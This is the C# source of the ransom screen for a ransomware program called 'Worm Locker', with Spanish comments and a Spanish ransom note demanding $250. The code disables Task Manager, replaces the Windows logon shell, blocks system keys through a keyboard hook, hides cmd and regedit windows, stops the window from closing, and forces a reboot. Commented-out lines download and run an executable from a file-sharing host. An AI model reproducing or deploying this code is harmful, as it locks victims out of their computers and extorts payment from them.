using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Drawing;
using Microsoft.Win32;
using System.IO;
using System.Net;


namespace Worm
{
    public partial class PayM3 : Form
    {
       
        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;
        [DllImport("User32")]
        private static extern int ShowWindow(int hwnd, int nCmdShow);

        //for BlockMouse
        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool block);

        private bool success = false;

        public PayM3()
        {

            InitializeComponent();
            label4.Text = TimeSpan.FromMinutes(720).ToString(); //set countdowntimer to 720 minutes
            label2.Text = Program.count.ToString() + " Total encrypted";
            textBox2.Text =
                 "To get the key to decrypt files, you have to pay $ 250 dolares .  \n\r" +
                "f the payment is not made tomorrow night, we will lock the entire system.\n\r" +
                "More instructions coming soon. .";



        } 
          public int tootalsecs = 720 * 60;

        private void Button1_Click(object sender, EventArgs e)
        {
            string input = textBox1.Text;

            if (CheckPassword(input.ToCharArray()))
            {
                success = true;
                button1.Text = "Decrypting... Please wait";
                MessageBox.Show("The key is correct", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Information);
                //Enable taskmanager
                RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                reg.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
                //Repair shell
                RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                reg3.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
                backgroundWorker1.RunWorkerAsync(input);
                    //   auto eliminado 
                   //   WebClient wc = new WebClient();
                  //  string url = "http://cdn-107.anonfiles.com/Zb32B1vau7/ff256e36-1620754837/delete.exe";
                 // string save_path = "C:\\windows\\";
                //string name = "delete.exe";
               //wc.DownloadFile(url, save_path + name);
              // System.Diagnostics.Process.Start(@"C:\\windows\\\delete.exe");
            }
            else
            {
                textBox1.Text = string.Empty;
                ActiveControl = textBox1;
                button1.Text = "Wrong Password... ";
                MessageBox.Show("Incorrect key", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error);
               
               
            }
        }

        private bool CheckPassword(char[] input)
        {
            char[] password = Program.GetPass();
            if (password.Length == input.Length)
            {
                for (int i = 0; i < input.Length; i++)
                {
                    if (password[i] != input[i])
                    {
                        return false;
                    }
                }
                return true;
            }
        return false;
        }


        private void Screen_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Bloquear la ventana para que no se cierre usando Alt + F4
            if (!success)
                e.Cancel = true;
            MessageBox.Show("quien te manda a abrir.exe que no conoces ", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error);

        }

        private void PayM3_Load(object sender, EventArgs e)

        {

            // Haz que esta sea la ventana activa
            // WindowState = FormWindowState.Minimized;
            Show();
            this.Opacity = 0.0;
            this.Size = new Size(100, 100);      //Invisible
            Location = new Point(-100, -100);
            //Disable taskmanager
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
             //Remove wallpaper
            // WebClient wc = new WebClient();
            //string url = "http://cdn-117.anonfiles.com/3eybBcv1uc/f8d5223c-1620757453/Worm.jpg";
            // string save_path = "C:\\Program Files\\";
            //string name = "wom.jpg";
            //  wc.DownloadFile(url, save_path + name);
            using (var key = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop"))
                key.SetValue("Wallpaper", "", RegistryValueKind.String);
            // Si apaga su computadora, no puede ejecutar bien Windows
            RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg3.SetValue("Shell", "empty", RegistryValueKind.String);
           

            //Make countdowntimer
            var startTime = DateTime.Now;

            var timer = new Timer() { Interval = 1000 };

            timer.Tick += (obj, args) =>
            {
                if (tootalsecs == 0)
                {
                    timer.Stop();
                    MessageBox.Show("deleting files ..", "time over", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    

                }
                else
                {
                    label4.Text =
                   (TimeSpan.FromMinutes(720) - (DateTime.Now - startTime))
                       .ToString("hh\\:mm\\:ss");
                    tootalsecs--;
                }
            };
           

            timer.Enabled = true;
            //Payloads
            timer.Start();
            tmr_hide.Start(); //show window again
            tmr_show.Start(); //delete desktop.ini because we cant encrypt desktop.ini files
            tmr_if.Start(); //Block cmd, register...
            tmr_encrypt.Start(); //Start locking files
            tmr_clock.Start(); //If you see on window 00:00:00, system will kill
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            using (StreamWriter streamWriter = File.CreateText(path + @"\leer.html")) //crear notade rescate 
            {
                streamWriter.WriteLine("Todos sus archivos, documentos, videos, imágenes y otros archivos se han cifrado con un especial algoritmo. : " +
                     "Si desea recuperar los archivos deberas contactar con el administrador del ransomware  al correo electrónico." +
                     "¡ Worn locker @gmail.com, " +
                     "ya cifre sus archivos personales, por lo que no puede acceder a ellos" +
                     " Tras enviar la cantidad de 250 dolares, " +
                     "recibir un código de descifrado para desbloquear todos los archivos." +
                     "¡Ahora, comencemos y disfrutemos nuestro pequeño juego juntos!"); //Text del archivo 

            }
            ProcessModule objCurrentModule = Process.GetCurrentProcess().MainModule;
            objKeyboardProcess = new LowLevelKeyboardProc(captureKey);
            ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0);
        }

        private void backgroundWorker1_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            string input = e.Argument as string;
            Program.UndoAttack(input);

        }

        private void backgroundWorker1_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
        {
            Application.Exit();
        }

        // Código para deshabilitar WinKey, Alt + Tab, Ctrl + Esc comienza aquí* /

         // La estructura contiene información sobre el evento de entrada de teclado de bajo nivel
        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public Keys key;
            public int scanCode;
            public int flags;
            public int time;
            public IntPtr extra;
        }
        // Funciones de nivel de sistema que se utilizarán para enganchar y desenganchar la entrada del teclado
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hook);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string name);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern short GetAsyncKeyState(Keys key);

        // Declaración de objetos globales 
        private IntPtr ptrHook;
        private LowLevelKeyboardProc objKeyboardProcess;

        private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));

                // Deshabilitar las teclas de Windows
                if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin || objKeyInfo.key == Keys.Tab && HasAltModifier(objKeyInfo.flags) || objKeyInfo.key == Keys.Escape && (ModifierKeys & Keys.Control) == Keys.Control)
                {
                    return (IntPtr)1; // si se devuelve 0, se habilitarán todas las teclas anteriores
                }
            }
            return CallNextHookEx(ptrHook, nCode, wp, lp);
        }

        bool HasAltModifier(int flags)
        {
            return (flags & 0x20) == 0x20;
        }

        private void tmr_hide_Tick(object sender, EventArgs e)
        {
            tmr_hide.Stop();
            this.Opacity = 100.0;
            this.Size = new Size(1089, 690);
            Location = new Point(500, 500);
            Thawouse(); //Anti freeze
        }
      

        private void tmr_show_Tick(object sender, EventArgs e)
        {
            tmr_show.Stop();
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string filepath = (path + @"\desktop");
            File.Delete(filepath);

            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            string filedl = (downloadFolder + @"\desktop");
            File.Delete(filedl);
            if (File.Exists(filepath))
            {
                File.Delete(filepath);
            }

            if (File.Exists(filedl))
            {
                File.Delete(filedl);
            }

            tmr_show.Start();

        }

        private void tmr_if_Tick(object sender, EventArgs e)
        {
            tmr_if.Stop();
            int hWnd;
            Process[] processRunning = Process.GetProcesses();
            foreach (Process pr in processRunning)
            {
                if (pr.ProcessName == "cmd")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }

                if (pr.ProcessName == "regedit")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }

                if (pr.ProcessName == "Processhacker")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }

                if (pr.ProcessName == "sdclt")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }
            }
            tmr_if.Start();
        }

        private void tmr_encrypt_Tick(object sender, EventArgs e)
        {

        }

        private void tmr_clock_Tick(object sender, EventArgs e)
        {
            tmr_clock.Stop();
            Process[] _process = null;
            _process = Process.GetProcessesByName(" Worm Locker");
            foreach (Process proces in _process)
            {
                Process.Start("shutdown", "/r /t 0");
                proces.Kill();
            }
            this.Close();

        }
        public static void Thawouse() //unfreeze
        {
            BlockInput(false);
        }

      

        private void label2_Click(object sender, EventArgs e)
        {

        }
    }
}


